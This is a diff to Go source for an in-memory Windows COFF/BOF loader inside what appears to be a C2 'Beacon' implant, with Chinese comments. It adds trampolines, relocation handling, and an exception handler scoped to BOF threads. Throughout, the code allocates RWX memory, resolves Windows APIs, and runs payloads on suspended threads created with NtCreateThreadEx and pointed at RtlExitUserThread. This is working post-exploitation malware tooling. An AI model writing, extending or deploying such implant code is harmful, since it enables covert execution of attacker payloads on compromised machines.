@@ -6,8 +6,10 @@ import (
 	"bytes"
 	"encoding/binary"
 	"fmt"
+	"math"
 	"runtime/debug"
 	"strings"
+	"sync"
 	"syscall"
 	"unsafe"
 
@@ -43,16 +45,17 @@ type SectionMap struct {
 
 // Coffee 是 Windows COFF BOF 加载器的核心结构体
 type Coffee struct {
-	Data      []byte           // 原始 COFF 文件内容
-	Symbols   []*pecoff.Symbol // COFF 符号表
-	Sections  []*pecoff.Section // COFF 节区列表
-	SecMap    []SectionMap      // 节区内存映射
-	ImageBase uintptr          // 分配的内存基地址
-	TotalSize uintptr          // 内存总大小
-	GOT       uintptr          // GOT 表地址（__imp_ 符号间接跳转）
-	BSS       uintptr          // BSS 区地址（未初始化全局变量）
-	GOTSize   uint32           // GOT 区大小
-	BSSSize   uint32           // BSS 区大小
+	Data       []byte            // 原始 COFF 文件内容
+	Symbols    []*pecoff.Symbol  // COFF 符号表
+	Sections   []*pecoff.Section // COFF 节区列表
+	SecMap     []SectionMap      // 节区内存映射
+	ImageBase  uintptr           // 分配的内存基地址
+	TotalSize  uintptr           // 内存总大小
+	GOT        uintptr           // GOT 表地址（__imp_ 符号间接跳转）
+	Trampoline uintptr           // 跳板区地址（无 dllimport 的外部函数调用）
+	BSS        uintptr           // BSS 区地址（未初始化全局变量）
+	GOTSize    uint32            // GOT 区大小
+	BSSSize    uint32            // BSS 区大小
 }
 
 // m128a 对应 Windows M128A 结构体（用于 CONTEXT 中的 XMM 寄存器）
@@ -139,6 +142,97 @@ type exceptionPointers struct {
 	ContextRecord   *threadContext
 }
 
+// exceptionRecord 对应 Windows EXCEPTION_RECORD 结构体（x64，仅读取前两个字段）
+type exceptionRecord struct {
+	ExceptionCode    uint32
+	ExceptionFlags   uint32
+	ExceptionRecord  uintptr
+	ExceptionAddress uintptr
+}
+
+// exceptionContinueSearch 表示当前处理器不处理该异常，交回系统继续搜索。
+const exceptionContinueSearch = 0
+
+// bofMemRange 记录一段属于活跃 BOF 的内存范围。
+type bofMemRange struct {
+	base uintptr
+	end  uintptr
+}
+
+// 全局活跃 BOF 注册表：VEH 只重定向属于 BOF 的异常，
+// 避免 BOF 执行期间 Beacon 主线程或其他 Go 线程的异常被静默吞掉。
+var (
+	activeBofMu      sync.RWMutex
+	activeBofRanges  []bofMemRange
+	activeBofThreads []uint32
+)
+
+func registerActiveBofRange(base, size uintptr) {
+	if base == 0 || size == 0 {
+		return
+	}
+	activeBofMu.Lock()
+	activeBofRanges = append(activeBofRanges, bofMemRange{base: base, end: base + size})
+	activeBofMu.Unlock()
+}
+
+func unregisterActiveBofRange(base uintptr) {
+	if base == 0 {
+		return
+	}
+	activeBofMu.Lock()
+	for i, r := range activeBofRanges {
+		if r.base == base {
+			activeBofRanges = append(activeBofRanges[:i], activeBofRanges[i+1:]...)
+			break
+		}
+	}
+	activeBofMu.Unlock()
+}
+
+func registerActiveBofThread(tid uint32) {
+	if tid == 0 {
+		return
+	}
+	activeBofMu.Lock()
+	activeBofThreads = append(activeBofThreads, tid)
+	activeBofMu.Unlock()
+}
+
+func unregisterActiveBofThread(tid uint32) {
+	if tid == 0 {
+		return
+	}
+	activeBofMu.Lock()
+	for i, t := range activeBofThreads {
+		if t == tid {
+			activeBofThreads = append(activeBofThreads[:i], activeBofThreads[i+1:]...)
+			break
+		}
+	}
+	activeBofMu.Unlock()
+}
+
+// shouldRedirectException 判断一个异常是否属于活跃 BOF：
+// 1. 异常地址落在 BOF 分配的内存范围内；
+// 2. 异常线程是 BOF 执行线程（兜底覆盖 BOF 线程栈溢出等地址不在 BOF 范围的情况）。
+// 两者都不命中时返回 false，异常交回系统正常处理。
+func shouldRedirectException(addr uintptr, tid uint32) bool {
+	activeBofMu.RLock()
+	defer activeBofMu.RUnlock()
+	for _, r := range activeBofRanges {
+		if addr >= r.base && addr < r.end {
+			return true
+		}
+	}
+	for _, t := range activeBofThreads {
+		if t == tid {
+			return true
+		}
+	}
+	return false
+}
+
 // alignUp 将地址向上对齐到 4KB 页边界
 func alignUp(val uintptr) uintptr {
 	return (val + 0xFFF) &^ 0xFFF
@@ -168,13 +262,22 @@ func winVirtualFree(address uintptr) error {
 // vectoredExceptionHandler 是 COFF BOF 的崩溃恢复处理器。
 // 当 BOF 代码触发异常时，将 RIP 重定向到 RtlExitUserThread 以安全退出线程，
 // 而不是崩溃整个 Beacon 进程。
+// vectoredExceptionHandler 是 COFF BOF 的崩溃恢复处理器。
+// 仅当异常属于当前活跃的 BOF（地址在 BOF 内存范围内，或异常线程是 BOF 执行线程）时，
+// 将 RIP 重定向到 RtlExitUserThread 安全退出线程；其他异常交回系统继续搜索，
+// 避免 BOF 执行期间吞掉 Beacon 主线程或其他 Go 线程的异常。
 func vectoredExceptionHandler(exceptionInfo uintptr) uintptr {
 	if exceptionInfo == 0 {
 		return 0
 	}
 	info := (*exceptionPointers)(unsafe.Pointer(exceptionInfo))
-	if info.ContextRecord == nil {
-		return 0
+	if info.ContextRecord == nil || info.ExceptionRecord == 0 {
+		return exceptionContinueSearch
+	}
+	exc := (*exceptionRecord)(unsafe.Pointer(info.ExceptionRecord))
+	tid := currentThreadID()
+	if !shouldRedirectException(exc.ExceptionAddress, tid) {
+		return exceptionContinueSearch
 	}
 
 	// 将 RIP 改为 RtlExitUserThread，线程会安全退出而非崩溃
@@ -188,6 +291,12 @@ func vectoredExceptionHandler(exceptionInfo uintptr) uintptr {
 	info.ContextRecord.Dr3 = 0
 
 	return exceptionContinue
+}
+
+// currentThreadID 返回当前线程 ID（VEH 在异常线程上下文执行）。
+func currentThreadID() uint32 {
+	ret, _, _ := syscall.SyscallN(ldrAPI.GetCurrentThreadId)
+	return uint32(ret)
 }
 
 // addVectoredExceptionHandler 注册 VEH（优先级最高）
@@ -257,6 +366,15 @@ func isImportSymbol(sym *pecoff.Symbol) bool {
 	return strings.HasPrefix(sym.NameString(), "__imp_")
 }
 
+// isFunctionSymbol 判断外部符号是否为函数类型。
+// pecoff 将 Type 字段按字节拆分，函数标记（IMAGE_SYM_DTYPE_FUNCTION<<4=0x20）落在 Base 中。
+func isFunctionSymbol(sym *pecoff.Symbol) bool {
+	if sym == nil {
+		return false
+	}
+	return sym.Type.Base&0x20 != 0 // IMAGE_SYM_DTYPE_FUNCTION << 4
+}
+
 // stripStdcallSuffix 去除 stdcall 后缀（如 CreateFileA@20 → CreateFileA）
 func stripStdcallSuffix(name string) string {
 	if idx := strings.Index(name, "@"); idx != -1 {
@@ -309,6 +427,157 @@ func resolveSymbolAddress(symbolName string, rt *bofRuntime) uintptr {
 		libName += ".dll"
 	}
 	return resolveAPI(libName, procName)
+}
+
+// applyRelocations 对 COFF 对象应用全部重定位。
+// 越界的符号索引与未支持的重定位类型会返回错误，避免静默产出错误代码。
+func applyRelocations(pCoffee *Coffee, rt *bofRuntime) error {
+	if pCoffee == nil {
+		return fmt.Errorf("coffee is nil")
+	}
+
+	gotIndex := 0
+	bssIdx := 0
+	gotMap := make(map[string]uintptr)   // __imp_ 符号 → GOT 槽地址
+	bssMap := make(map[int]uintptr)      // 符号索引 → BSS 地址
+	trampMap := make(map[string]uintptr) // 无 dllimport 函数符号 → 跳板地址
+	trampIdx := 0
+
+	for i, sec := range pCoffee.Sections {
+		if sec.SizeOfRawData == 0 {
+			continue
+		}
+		secAddr := pCoffee.SecMap[i].Ptr
+
+		for _, reloc := range sec.Relocations() {
+			symIdx := int(reloc.SymbolTableIndex)
+			if symIdx < 0 || symIdx >= len(pCoffee.Symbols) {
+				return fmt.Errorf("relocation symbol index %d out of range (symbols=%d)", symIdx, len(pCoffee.Symbols))
+			}
+			sym := pCoffee.Symbols[symIdx]
+			// 跳过无效符号和绝对重定位
+			if sym.StorageClass > 3 || reloc.Type == windef.IMAGE_REL_AMD64_ABSOLUTE {
+				continue
+			}
+
+			relocAddr := secAddr + uintptr(reloc.VirtualAddress)
+
+			if isSpecialSymbol(sym) {
+				if isImportSymbol(sym) {
+					// __imp_ 符号: 填充 GOT 表项，重定位指向 GOT 槽（call [rip+disp] 模式）
+					rawName := sym.NameString()
+					slot, ok := gotMap[rawName]
+					if !ok {
+						extAddr := resolveSymbolAddress(rawName, rt)
+						if extAddr == 0 {
+							return fmt.Errorf("failed to resolve: %s", rawName)
+						}
+						slot = pCoffee.GOT + uintptr(gotIndex*8)
+						*(*uintptr)(unsafe.Pointer(slot)) = extAddr // 写入实际地址
+						gotMap[rawName] = slot
+						gotIndex++
+					}
+					if err := writeReloc(relocAddr, windef.IMAGE_REL_AMD64_REL32, slot, pCoffee.ImageBase); err != nil {
+						return fmt.Errorf("section %q reloc @0x%X sym %q: %w", sec.NameString(), relocAddr, rawName, err)
+					}
+					continue
+				}
+
+				// 非 __imp_ 外部符号:
+				// 函数类型（无 dllimport 的 BOF）尝试解析为 Beacon API / DLL 导出并走 GOT 槽；
+				// 数据符号或解析失败时在 BSS 中分配空间。
+				rawName := sym.NameString()
+				if isFunctionSymbol(sym) {
+					if extAddr := resolveSymbolAddress(rawName, rt); extAddr != 0 {
+						tramp, ok := trampMap[rawName]
+						if !ok {
+							tramp = pCoffee.Trampoline + uintptr(trampIdx*12)
+							// 跳板: mov rax, imm64; jmp rax（48 B8 <imm64> FF E0）
+							buf := (*[12]byte)(unsafe.Pointer(tramp))
+							buf[0] = 0x48
+							buf[1] = 0xB8
+							*(*uint64)(unsafe.Pointer(&buf[2])) = uint64(extAddr)
+							buf[10] = 0xFF
+							buf[11] = 0xE0
+							trampMap[rawName] = tramp
+							trampIdx++
+						}
+						if err := writeReloc(relocAddr, windef.IMAGE_REL_AMD64_REL32, tramp, pCoffee.ImageBase); err != nil {
+							return fmt.Errorf("section %q reloc @0x%X sym %q: %w", sec.NameString(), relocAddr, rawName, err)
+						}
+						continue
+					}
+				}
+
+				target, ok := bssMap[symIdx]
+				if !ok {
+					target = pCoffee.BSS + uintptr(bssIdx) + 4
+					bssMap[symIdx] = target
+					bssIdx += int(sym.Value)
+				}
+				if err := writeReloc(relocAddr, reloc.Type, target, pCoffee.ImageBase); err != nil {
+					return fmt.Errorf("section %q reloc @0x%X sym %q: %w", sec.NameString(), relocAddr, sym.NameString(), err)
+				}
+				continue
+			}
+
+			// 内部符号: 定位到所在 section 的基地址
+			if sym.SectionNumber <= 0 || int(sym.SectionNumber) > len(pCoffee.SecMap) {
+				return fmt.Errorf("invalid section idx")
+			}
+			target := pCoffee.SecMap[int(sym.SectionNumber-1)].Ptr + uintptr(sym.Value)
+			if err := writeReloc(relocAddr, reloc.Type, target, pCoffee.ImageBase); err != nil {
+				return fmt.Errorf("section %q reloc @0x%X sym %q: %w", sec.NameString(), relocAddr, sym.NameString(), err)
+			}
+		}
+	}
+
+	return nil
+}
+
+// writeReloc 按 AMD64 COFF 重定位语义修正位置上的值。
+// addend 取自重定位位置原有的内容；未支持的类型返回错误。
+// ADDR64/ADDR32 写绝对地址，ADDR32NB 写 RVA（target-imageBase），REL32* 系列写相对地址。
+func writeReloc(relocAddr uintptr, relocType uint16, target uintptr, imageBase uintptr) error {
+	switch relocType {
+	case windef.IMAGE_REL_AMD64_ADDR64:
+		addend := *(*uint64)(unsafe.Pointer(relocAddr))
+		*(*uint64)(unsafe.Pointer(relocAddr)) = uint64(target) + addend
+
+	case windef.IMAGE_REL_AMD64_ADDR32:
+		addend := uint64(*(*uint32)(unsafe.Pointer(relocAddr)))
+		val := uint64(target) + addend
+		if val > math.MaxUint32 {
+			return fmt.Errorf("ADDR32 value 0x%X overflows 32-bit at reloc @0x%X", val, relocAddr)
+		}
+		*(*uint32)(unsafe.Pointer(relocAddr)) = uint32(val)
+
+	case windef.IMAGE_REL_AMD64_ADDR32NB:
+		addend := uint64(*(*uint32)(unsafe.Pointer(relocAddr)))
+		val := uint64(target-imageBase) + addend
+		if val > math.MaxUint32 {
+			return fmt.Errorf("ADDR32NB value 0x%X overflows 32-bit at reloc @0x%X", val, relocAddr)
+		}
+		*(*uint32)(unsafe.Pointer(relocAddr)) = uint32(val)
+
+	case windef.IMAGE_REL_AMD64_REL32,
+		windef.IMAGE_REL_AMD64_REL32_1,
+		windef.IMAGE_REL_AMD64_REL32_2,
+		windef.IMAGE_REL_AMD64_REL32_3,
+		windef.IMAGE_REL_AMD64_REL32_4,
+		windef.IMAGE_REL_AMD64_REL32_5:
+		disp := uintptr(relocType - windef.IMAGE_REL_AMD64_REL32)
+		addend := int32(*(*uint32)(unsafe.Pointer(relocAddr)))
+		val := int64(target) + int64(addend) - int64(relocAddr) - 4 - int64(disp)
+		if val < math.MinInt32 || val > math.MaxInt32 {
+			return fmt.Errorf("REL32 value %d out of range at reloc @0x%X", val, relocAddr)
+		}
+		*(*uint32)(unsafe.Pointer(relocAddr)) = uint32(int32(val))
+
+	default:
+		return fmt.Errorf("unsupported relocation type %d (%s)", relocType, amd64RelocName(relocType))
+	}
+	return nil
 }
 
 // Load 加载默认方法 "go"
@@ -365,11 +634,15 @@ func LoadWithMethodOutputStopEvent(coffBytes []byte, argBytes []byte, method str
 		SecMap:   make([]SectionMap, parsed.Sections.Len()),
 	}
 
-	// 预计算 GOT 和 BSS 大小
+	// 预计算 GOT（指针槽 + 跳板）和 BSS 大小
+	impCount := 0
 	for _, sym := range pCoffee.Symbols {
 		if isSpecialSymbol(sym) {
 			if isImportSymbol(sym) {
 				pCoffee.GOTSize += 8 // 每个 __imp_ 符号需要一个指针槽
+				impCount++
+			} else if isFunctionSymbol(sym) {
+				pCoffee.GOTSize += 12 // 无 dllimport 的函数符号需要一个跳板（mov rax,imm64; jmp rax）
 			} else {
 				pCoffee.BSSSize += sym.Value + 8 // 普通外部符号占用 BSS
 			}
@@ -395,7 +668,9 @@ func LoadWithMethodOutputStopEvent(coffBytes []byte, argBytes []byte, method str
 		return err
 	}
 	pCoffee.ImageBase = baseAddr
+	registerActiveBofRange(baseAddr, pCoffee.TotalSize)
 	defer winVirtualFree(baseAddr)
+	defer unregisterActiveBofRange(baseAddr)
 
 	printf("[+] Allocated BOF buffer at %p (Size: %d)\n", unsafe.Pointer(baseAddr), pCoffee.TotalSize)
 
@@ -410,117 +685,29 @@ func LoadWithMethodOutputStopEvent(coffBytes []byte, argBytes []byte, method str
 		pNextBase += alignUp(uintptr(sec.SizeOfRawData))
 	}
 	pCoffee.GOT = baseAddr + gotOffset
+	pCoffee.Trampoline = pCoffee.GOT + alignUp(uintptr(impCount*8))
 	pCoffee.BSS = baseAddr + bssOffset
 
 	// 重定位处理
-	gotIndex := 0
-	bssIdx := 0
-	gotMap := make(map[string]uintptr) // __imp_ 符号 → GOT 槽地址
-	bssMap := make(map[int]uintptr)    // 符号索引 → BSS 地址
+	if err := applyRelocations(pCoffee, rt); err != nil {
+		return err
+	}
 
+	// 可执行节区设置 PAGE_EXECUTE_READWRITE 保护
 	for i, sec := range pCoffee.Sections {
 		if sec.SizeOfRawData == 0 {
 			continue
 		}
 		secAddr := pCoffee.SecMap[i].Ptr
-
-		for _, reloc := range sec.Relocations() {
-			sym := pCoffee.Symbols[reloc.SymbolTableIndex]
-			// 跳过无效符号和绝对重定位
-			if sym.StorageClass > 3 || reloc.Type == windef.IMAGE_REL_AMD64_ABSOLUTE {
-				continue
-			}
-
-			var funcSlot uintptr   // GOT 槽地址（外部函数）
-			var symbolSecAddr uintptr // 符号所在 section 的基地址
-			var bssAddr uintptr    // BSS 中的地址（外部数据）
-			relocAddr := secAddr + uintptr(reloc.VirtualAddress)
-
-			if isSpecialSymbol(sym) {
-				if isImportSymbol(sym) {
-					// __imp_ 符号: 填充 GOT 表项
-					rawName := sym.NameString()
-					if slot, ok := gotMap[rawName]; ok {
-						funcSlot = slot // 已分配过
-					} else {
-						extAddr := resolveSymbolAddress(rawName, rt)
-						if extAddr == 0 {
-							return fmt.Errorf("failed to resolve: %s", rawName)
-						}
-						funcSlot = pCoffee.GOT + uintptr(gotIndex*8)
-						*(*uintptr)(unsafe.Pointer(funcSlot)) = extAddr // 写入实际地址
-						gotMap[rawName] = funcSlot
-						gotIndex++
-					}
-				} else {
-					// 普通外部符号: 在 BSS 中分配空间
-					symIndex := int(reloc.SymbolTableIndex)
-					if addr, ok := bssMap[symIndex]; ok {
-						bssAddr = addr
-					} else {
-						bssAddr = pCoffee.BSS + uintptr(bssIdx) + 4
-						bssMap[symIndex] = bssAddr
-						bssIdx += int(sym.Value)
-					}
-				}
-			} else {
-				// 内部符号: 获取其所在 section 的基地址
-				if sym.SectionNumber <= 0 || int(sym.SectionNumber) > len(pCoffee.SecMap) {
-					return fmt.Errorf("invalid section idx")
-				}
-				symbolSecAddr = pCoffee.SecMap[int(sym.SectionNumber-1)].Ptr
-			}
-
-			// 应用重定位修正
-			if funcSlot != 0 {
-				// 外部函数: 写入 PC-relative 偏移到 GOT 槽
-				offset := uint32(funcSlot - relocAddr - 4)
-				*(*uint32)(unsafe.Pointer(relocAddr)) = offset
-			} else {
-				// 根据重定位类型计算修正值
-				if reloc.Type >= windef.IMAGE_REL_AMD64_REL32 && reloc.Type <= windef.IMAGE_REL_AMD64_REL32_5 {
-					var offset uint32
-					disp := uintptr(reloc.Type - 4)
-					if bssAddr != 0 {
-						offset = uint32(bssAddr - disp - (relocAddr + 4))
-					} else if (sym.StorageClass == windef.IMAGE_SYM_CLASS_STATIC && sym.Value != 0) || (sym.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && sym.SectionNumber != 0) {
-						offset = uint32(uintptr(sym.Value) + symbolSecAddr - relocAddr - 4 - disp)
-					} else {
-						orig := *(*uint32)(unsafe.Pointer(relocAddr))
-						offset = uint32(uintptr(orig) + symbolSecAddr - relocAddr - 4 - disp)
-					}
-					*(*uint32)(unsafe.Pointer(relocAddr)) = offset
-				} else if reloc.Type == windef.IMAGE_REL_AMD64_ADDR32NB {
-					var offset uint32
-					if bssAddr != 0 {
-						offset = uint32(bssAddr - (relocAddr + 4))
-					} else if (sym.StorageClass == windef.IMAGE_SYM_CLASS_STATIC && sym.Value != 0) || (sym.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && sym.SectionNumber != 0) {
-						offset = uint32(uintptr(sym.Value) + symbolSecAddr - relocAddr - 4)
-					} else {
-						orig := *(*uint32)(unsafe.Pointer(relocAddr))
-						offset = uint32(uintptr(orig) + symbolSecAddr - relocAddr - 4)
-					}
-					*(*uint32)(unsafe.Pointer(relocAddr)) = offset
-				} else if reloc.Type == windef.IMAGE_REL_AMD64_ADDR64 {
-					var val uint64
-					if bssAddr != 0 {
-						val = uint64(bssAddr - (relocAddr + 4))
-					} else if (sym.StorageClass == windef.IMAGE_SYM_CLASS_STATIC && sym.Value != 0) || (sym.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && sym.SectionNumber != 0) {
-						val = uint64(uintptr(sym.Value) + symbolSecAddr)
-					} else {
-						orig := *(*uint64)(unsafe.Pointer(relocAddr))
-						val = uint64(uintptr(orig) + symbolSecAddr)
-					}
-					*(*uint64)(unsafe.Pointer(relocAddr)) = val
-				}
-			}
-		}
-
-		// 可执行节区设置 PAGE_EXECUTE_READWRITE 保护
 		if sec.Characteristics&imageScnMemExecute != 0 {
 			var oldProtect uint32
 			syscall.SyscallN(ldrAPI.VirtualProtect, secAddr, uintptr(sec.SizeOfRawData), uintptr(pageExecuteReadWrite), uintptr(unsafe.Pointer(&oldProtect)))
 		}
+	}
+	// GOT 区含跳板（mov rax,imm64; jmp rax），需要可执行权限
+	if pCoffee.GOT != 0 {
+		var oldProtect uint32
+		syscall.SyscallN(ldrAPI.VirtualProtect, pCoffee.GOT, uintptr(pCoffee.GOTSize), uintptr(pageExecuteReadWrite), uintptr(unsafe.Pointer(&oldProtect)))
 	}
 
 	// 注册 .pdata 异常处理表（用于 VEH 和 Windows 异常展开）
@@ -630,8 +817,8 @@ func hitCoffeeEntryPointWithThread(entry uintptr, pArg uintptr, argLen uintptr) 
 		uintptr(unsafe.Pointer(&hThread)),
 		uintptr(threadAllAccess),
 		0,
-		uintptr(^uintptr(0)),         // 最大地址
-		ldrAPI.RtlExitUserThread,     // 初始入口（安全退出点）
+		uintptr(^uintptr(0)),     // 最大地址
+		ldrAPI.RtlExitUserThread, // 初始入口（安全退出点）
 		0,
 		uintptr(threadCreateSuspended), // 创建后挂起
 		0, 0, 0, 0,
@@ -640,6 +827,9 @@ func hitCoffeeEntryPointWithThread(entry uintptr, pArg uintptr, argLen uintptr) 
 		return fmt.Errorf("NtCreateThreadEx error: 0x%X", ret)
 	}
 	defer syscall.SyscallN(ldrAPI.CloseHandle, hThread)
+	tidRet, _, _ := syscall.SyscallN(ldrAPI.GetThreadId, hThread)
+	registerActiveBofThread(uint32(tidRet))
+	defer unregisterActiveBofThread(uint32(tidRet))
 
 	// 获取线程上下文
 	_, ctx := alignedContextBuffer()
